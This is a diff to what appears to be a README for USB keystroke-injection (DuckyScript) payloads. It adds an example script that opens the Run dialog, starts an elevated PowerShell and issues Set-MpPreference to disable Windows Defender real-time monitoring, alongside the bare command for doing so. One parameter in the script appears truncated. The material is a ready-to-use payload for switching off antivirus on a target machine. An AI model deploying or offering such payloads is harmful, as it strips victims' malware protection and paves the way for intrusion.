@@ -4,8 +4,25 @@ Windows defender can be disabled with PS using the following command
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-An example script: 
+Example scripts:
+
+_Dec 24, 2018_ 
+```
+REM Windows 10: Disable Windows Defender with Powershell
+REM Author: Judge2020
+REM author website: Judge2020.com
+REM
+DELAY 1000
+GUI r
+DELAY 200
+REM Start an elevated powershell instance which will disable Windows Defender.
+STRING start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+ENTER
+ALT y
+```
+
 Note: line with "ALT y" may not be required and could lead to error in the next line.  
+_Apr 23, 2018_
 ```
 REM Windows 10: Disable Windows Defender with Powershell
 REM Author: Judge2020
